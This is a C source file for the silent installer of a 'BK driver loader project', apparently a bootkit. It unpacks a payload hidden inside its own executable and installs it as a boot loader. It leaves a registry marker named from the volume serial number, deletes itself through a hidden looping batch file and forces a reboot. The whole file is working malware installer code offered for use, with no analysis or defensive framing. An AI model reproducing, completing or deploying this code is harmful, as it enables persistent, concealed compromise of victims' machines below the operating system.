//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// BK driver loader project. Version 2.
//	
// module: bksetup.c
// description: 
//	Silent BK setup utility.

#include <Shlwapi.h>
#include "..\bkgen\main.h"
#include "..\bklib\bklib.h"
#include "..\bklib\pesup.h"
#include "joiner.h"
#include "depack.h"


#define DOS_NAME_LEN	8+1+3+1	// 8.3 name size in chars with 0
#define	tczOpen			_T("open")
#define	tczRunas		_T("runas")
#define tczBkSlash		_T("\\")
#define tczBatFmt		_T("%lu.bat")
#define tczBatchFile	_T("attrib -r -s -h%1\r\n:klabel\r\ndel %1\r\nif exist %1 goto klabel\r\ndel %0\r\n")
#define szKernel32		"KERNEL32.DLL"

#define GUID_STR_LEN	16*2+4+2	// length of the GUID string in chars
#define tczGuidStrTempl	_T("{%08X-%04X-%04X-%04X-%08X%04X}")
#define	tczProgramKey	_T("Software\\Classes\\CLSID\\")


typedef BOOL (WINAPI *LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);

HANDLE	g_AppHeap = 0;
ULONG	g_CurrentOsVersion = 0;
ULONG	g_CurrentProcessId = 0;
PIMAGE_DOS_HEADER	g_CurrentModuleBase = NULL;



__declspec(dllimport)
HRESULT CoInitializeEx(LPVOID pvReserved, DWORD dwCoInit);


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Generates pseudo random number based on the specified seed value.
//	Since NtRandom on Vista returns process-specific results, we use this function to create inter-process common names.
//
ULONG MyRandom(PULONG pSeed)
{
	return(*pSeed = 1664525*(*pSeed)+1013904223);
}


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Generates a GUID based on the specified seed value. The same seeds will create the same GUIDs on the same machine.
//
VOID GenGuid(GUID* pGuid, PULONG pSeed)
{
	ULONG i;
	pGuid->Data1 = MyRandom(pSeed);
	pGuid->Data2 = (USHORT)MyRandom(pSeed);
	pGuid->Data3 = (USHORT)MyRandom(pSeed);
	for (i=0; i<8; i++)
		pGuid->Data4[i] = (UCHAR)MyRandom(pSeed);
}


///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Converts the specified GUID structure into 0-terminated string.
//
LPTSTR GuidToString(GUID* pGuid)
{
	LPTSTR GuidStr = (LPTSTR)vAlloc((GUID_STR_LEN+1)*sizeof(_TCHAR));
	if (GuidStr)
		wsprintf(GuidStr, tczGuidStrTempl, pGuid->Data1, pGuid->Data2, pGuid->Data3, *(USHORT*)&pGuid->Data4[0], *(ULONG*)&pGuid->Data4[2],  *(USHORT*)&pGuid->Data4[6]);

	return(GuidStr);
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Generates a string containig the Prefix, random GUID based on spesified Seed, and the Postfix.
//
LPTSTR GuidName(
				IN OUT	PULONG pSeed,				// pointer to a random seed value
				IN		LPTSTR Prefix OPTIONAL		// pointer to a prefix string (optional)
				)
{
	ULONG	NameLen = GUID_STR_LEN + 1;
	LPTSTR	GuidStr, Name = NULL;
	GUID	Guid;

	GenGuid(&Guid, pSeed);
	if (GuidStr = GuidToString(&Guid))
	{
		if (Prefix)
			NameLen += lstrlen(Prefix);

		if (Name = (LPTSTR)vAlloc(NameLen*sizeof(_TCHAR)))
		{
			Name[0] = 0;

			if (Prefix)
				lstrcpy(Name, Prefix);
		
			lstrcat(Name, GuidStr);
		}
		vFree(GuidStr);
		
	}	// if (GuidStr = 
	return(Name);
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Returns TRUE if the specified PID belongs to a WOW64 process.
//
BOOL	IsWow64Process(ULONG Pid)
{
	BOOL Ret =  FALSE;
	LPFN_ISWOW64PROCESS fnIsWow64Process = NULL;

	fnIsWow64Process = (LPFN_ISWOW64PROCESS) GetProcAddress(GetModuleHandleA(szKernel32),"IsWow64Process");
	if (fnIsWow64Process)
	{
		HANDLE	hProcess;
		if (hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, Pid))
		{
			if (!fnIsWow64Process(hProcess, &Ret))
				// An error occured: unable to get OS architecture type. Assume we are on x86 and process is not WOW64 process.
				Ret = FALSE;
			CloseHandle(hProcess);
		}
	}	// if (fnIsWow64Process)
	return(Ret);
}


//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Allocates a buffer and fills it with the full path of the executable file of the current process.
//  The caller is responsable for freeing the buffer.
//	If the function fails, the return value is NULL. To get extended error information, call GetLastError.
//
static LPTSTR GetCurrentProcessFilePath(VOID)
{
	ULONG	nSize = MAX_PATH;
	ULONG	rSize = 0;
	LPTSTR	FilePath = (LPTSTR)vAlloc(nSize*sizeof(_TCHAR));

	while ((FilePath) && (rSize = GetModuleFileName(NULL, FilePath, nSize)) == nSize)
	{
		// Buffer is not large enough 
		vFree(FilePath);
		nSize += MAX_PATH;
		FilePath = (LPTSTR)vAlloc(nSize*sizeof(_TCHAR));
	}

	if ((FilePath) && (rSize == 0))
	{
		// GetModuleFileName() returned an error 
		vFree(FilePath);
		FilePath = NULL;
	}

	return(FilePath);
}



///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Creates the BAT file with the specified name and content and runs it with the specified parameters string.
//
#pragma warning (push)
#pragma warning (disable: 4311)	//  'type cast' : pointer truncation from 'HINSTANCE' to 'WINERROR'
static WINERROR CreateAndStartBat(
			LPTSTR FilePath,		// Name of the BAT file to create
			PCHAR Content,			// Content of the BAT file
			LPTSTR ParamStr			// Parameters string for the BAT file
			)
{
	WINERROR Status = NO_ERROR;
	HANDLE hFile;
	ULONG Written;

	hFile = CreateFile(FilePath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile != INVALID_HANDLE_VALUE)
	{

		if (!WriteFile(hFile, Content,(ULONG)lstrlen(Content), &Written, NULL))
			Status = GetLastError();

		CloseHandle(hFile);

		if (Status == NO_ERROR)
		{
			HINSTANCE hInst = ShellExecute(0, tczOpen, FilePath, ParamStr, NULL, SW_HIDE);
			if (hInst < (HINSTANCE)32)
				Status = (WINERROR)hInst;
		}
	}
	else
		Status = GetLastError();

	return(Status);
}
#pragma warning (pop)


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Creates a BAT file that attemts to delete this module in infinite loop.
//	Then this BAT file deletes itself.
//
static WINERROR DoSelfDelete(VOID)
{
	WINERROR Status = ERROR_UNSUCCESSFULL;
	LPTSTR	ThisFilePath	= NULL;
	LPTSTR	BatFilePath		= NULL;
	LPTSTR	BatFileParam	= NULL;

	do 
	{
		LPTSTR	FileName;
		ULONG	NameLen;

		if (!(ThisFilePath = GetCurrentProcessFilePath()))
			break;

		NameLen = (ULONG)lstrlen(ThisFilePath);

		// It's guaranteed that BAT file path string will fit into the BatFilePath buffer 
		if (!(BatFilePath = (LPTSTR)vAlloc((NameLen + DOS_NAME_LEN)*sizeof(_TCHAR))))
			break;

		if (!(BatFileParam = (LPTSTR)vAlloc((NameLen+3)*sizeof(_TCHAR))))	// 2 chars for "" and one for 0
			break;

		lstrcpy(BatFilePath, ThisFilePath);
		FileName = strrchr(BatFilePath, _T('\\'));
		ASSERT(FileName);
		FileName += 1;

		wsprintf(FileName, tczBatFmt, GetTickCount());
		wsprintf(BatFileParam, _T("\"%s\""), ThisFilePath);		

		Status = CreateAndStartBat(BatFilePath, tczBatchFile, BatFileParam);
	
	}while (FALSE);

	if (Status == ERROR_UNSUCCESSFULL)
		Status = GetLastError();

	if (ThisFilePath)
		vFree(ThisFilePath);

	if (BatFilePath)
		vFree(BatFilePath);

	if (BatFileParam)
		vFree(BatFileParam);

	return(Status);
}

BOOL	GetJoinedData(PIMAGE_DOS_HEADER	LoaderBase, PCHAR* pBuffer, PULONG pSize, BOOL Is64Bit)
{
	BOOL	Ret = FALSE;
	PIMAGE_NT_HEADERS		Pe;
	PIMAGE_SECTION_HEADER	Section;
	PADDON_DESCRIPTOR		AdDesc;

	Pe = (PIMAGE_NT_HEADERS)((PCHAR)LoaderBase + LoaderBase->e_lfanew);
	Section = IMAGE_FIRST_SECTION(Pe);
	AdDesc = (PADDON_DESCRIPTOR)(Section + Pe->FileHeader.NumberOfSections + 1);

	while (AdDesc->Magic != 0 && AdDesc->Magic != ADDON_MAGIC)
		AdDesc += 1;

	while (AdDesc->Magic == ADDON_MAGIC)
	{
		if (((AdDesc->Flags & PE_FLAG_X64) && Is64Bit) || (!(AdDesc->Flags & PE_FLAG_X64) && !Is64Bit))
		{
			PCHAR	Unpacked;
			if (Unpacked = vAlloc(AdDesc->ImageSize))
			{
				if (aP_depack((PCHAR)LoaderBase + AdDesc->ImageRva, Unpacked) == AdDesc->ImageSize)
				{
					*pBuffer = Unpacked;
					*pSize = AdDesc->ImageSize;
					Ret = TRUE;
					break;
				}
				else
					vFree(Unpacked);
			}	// if (Unpacked = ExAllocatePool(PagedPool, PackedHeader->OriginalSize))
		}	// if (((AdDesc->Flags & PE_FLAG_X64) && Is64Bit) || (!(AdDesc->Flags & PE_FLAG_X64) && !Is64Bit))
		AdDesc += 1;
	}	// while (AdDesc->Magic == ADDON_MAGIC)

	return(Ret);
}

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Allocates PE image from the buffer within the current process.
//
PCHAR	AllocateImage(
					PCHAR	ModuleBuffer,		// Buffer containing image file
					PULONG	pImageSize			//
					)
{
	PVOID		ImageBase = NULL;
	ULONG		i, bSize, ImageSize = 0;
	PIMAGE_NT_HEADERS		Pe = (PIMAGE_NT_HEADERS)PeSupGetImagePeHeader(ModuleBuffer);
	PIMAGE_SECTION_HEADER	Section = IMAGE_FIRST_SECTION(Pe);
	ULONG	NumberSections	= Pe->FileHeader.NumberOfSections;
	ULONG	FileAlign		= PeSupGetOptionalField(Pe, FileAlignment);

	ImageSize = PeSupGetOptionalField(Pe, SizeOfImage);

	if (ImageBase = vAlloc(ImageSize))
	{
		memset(ImageBase, 0, ImageSize);
		memcpy(ImageBase, ModuleBuffer, PeSupGetOptionalField(Pe, SizeOfHeaders));

		// Copying sections
		for(i=0; i<NumberSections; i++)
		{
			bSize = PeSupAlign(Section->SizeOfRawData, FileAlign);
			if (bSize)
				RtlCopyMemory((PCHAR)ImageBase + Section->VirtualAddress, ModuleBuffer + Section->PointerToRawData, bSize);
			Section += 1;
		}

		*pImageSize = ImageSize;
	}	// if (ImageBase = vAlloc(ImageSize))
	
	return((PCHAR)ImageBase);
}


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Enables SeShutdownPrivilege for the current process and attempts to reboot the system.
//
VOID Reboot(VOID)
{
	BOOL OldValue;

	if (NT_SUCCESS(RtlAdjustPrivilege(SE_SHUTDOWN_PRIVILEGE, TRUE, FALSE, (PBOOLEAN)&OldValue)))
		ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0);
}


/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Allocates a buffer and generates pseudo-random program key name using system volume serial number as random seed.
//	
PCHAR	GetProgramKeyName(VOID)
{
	PCHAR	KeyName = NULL;
	PCHAR	RootDir;
	ULONG	VolumeSerial = 0;

	if (RootDir = vAlloc(PAGE_SIZE))
	{
		if (GetWindowsDirectory(RootDir, PAGE_SIZE))
		{
			PCHAR	Slash = strchr(RootDir, '\\');
			if (Slash)
				Slash[1] = 0;

			if (GetVolumeInformation(RootDir, NULL, 0, &VolumeSerial, NULL, NULL, NULL, 0))
				KeyName = GuidName(&VolumeSerial, tczProgramKey);
		}	// if (GetWindowsDirectory(RootDir, PAGE_SIZE))
		vFree(RootDir);
	}	// if (RootDir = vAlloc(PAGE_SIZE))
	return(KeyName);
}


WINERROR	SetupBk(BOOL IsExe)
{
	WINERROR	Status = ERROR_UNSUCCESSFULL;
	CHAR		VersionHi;
	BOOL		Elevated = TRUE;
	ULONG		PayloadSize;
	PCHAR		ProgramKeyName = NULL, Image, Payload = NULL;
	HKEY		hKey;

		
	do	// not a loop
	{
		// Generating pseudo-random program key name 
		if (!(ProgramKeyName = GetProgramKeyName()))
		{
			DbgPrint("BKSETUP: Failed generating program key name.\n");
			break;
		}

		// Checking if we were already installed
		if (RegOpenKey(HKEY_LOCAL_MACHINE, ProgramKeyName, &hKey) == NO_ERROR)
		{
			RegCloseKey(hKey);
			Status = ERROR_ALREADY_EXISTS;
			DbgPrint("BKSETUP: Already installed.\n");
			break;
		}

		g_CurrentOsVersion = GetVersion();
		VersionHi = LOBYTE(LOWORD(g_CurrentOsVersion));

		// Checking if current OS supported
		if (VersionHi != 5)
		{
			Status = ERROR_OLD_WIN_VERSION;
			DbgPrint("BKSETUP: OS not supported.\n");
			break;
		}

		// Unpacking joined module depending on current OS architecture
		if (!GetJoinedData(g_CurrentModuleBase, &Payload, &PayloadSize, IsWow64Process(g_CurrentProcessId)))
		{
			Status = ERROR_FILE_NOT_FOUND;
			DbgPrint("BKSETUP: No joined payload found.\n");
			break;
		}

		if (Image = AllocateImage(Payload, &PayloadSize))
		{
			vFree(Payload);
			Payload = Image;
		}

		// Installing the boot loader
		if (!BkSetupWithPayload(Payload, PayloadSize))
		{
			DbgPrint("BKSETUP: Installation failed because of unknown reason.\n");
			break;
		}

		// Creating program key to mark that we were installed
		if (RegCreateKey(HKEY_LOCAL_MACHINE, ProgramKeyName, &hKey) == NO_ERROR)
			RegCloseKey(hKey);

		Status = NO_ERROR;
		DbgPrint("BKSETUP: Successfully installed.\n");
	} while(FALSE);

	if (Status == ERROR_UNSUCCESSFULL)
		Status = GetLastError();

	if (Payload)
		vFree(Payload);

	if (ProgramKeyName)
		vFree(ProgramKeyName);

	if (IsExe)
		DoSelfDelete();

	if (Status == NO_ERROR)
	{
		// One second timeout to let the Self Delete BAT-file initialize, then reboot.
		Sleep(1000);
		Reboot();
	}
	
	return(Status);
}


///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	 This is our application EntryPoint function.
//
WINERROR APIENTRY _tWinMain(
				HINSTANCE hInstance,
                HINSTANCE hPrevInstance,
                LPTSTR    lpCmdLine,
                int       nCmdShow
				)
{
	WINERROR Status = NO_ERROR;

	DbgPrint("BKSETUP: Version: 1.0\n");
	g_CurrentProcessId = GetCurrentProcessId();
	DbgPrint("BKSETUP: Started as win32 process 0x%x.\n", g_CurrentProcessId);

	g_CurrentModuleBase = (PIMAGE_DOS_HEADER)GetModuleHandle(NULL);
	Status = SetupBk(TRUE);

	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(nCmdShow);
	UNREFERENCED_PARAMETER(lpCmdLine);
	UNREFERENCED_PARAMETER(hInstance);

	DbgPrint("BKSETUP: Process 0x%x finished with status %u.\n", g_CurrentProcessId, Status);

	return(Status);
}


///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	 This is our application EntryPoint function to build it without CRT startup code.
//
INT _cdecl main(VOID)
{
	WINERROR Status = NO_ERROR;

	DbgPrint("BKSETUP: Version: 1.0\n");
	g_CurrentProcessId = GetCurrentProcessId();
	DbgPrint("BKSETUP: Started as win32 process 0x%x\n", g_CurrentProcessId);

	g_CurrentModuleBase = (PIMAGE_DOS_HEADER)GetModuleHandle(NULL);
	Status = SetupBk(TRUE);

	DbgPrint("BKSETUP: Process 0x%x finished with status %u\n",g_CurrentProcessId, Status);
	ExitProcess(Status);
	return(Status);
}
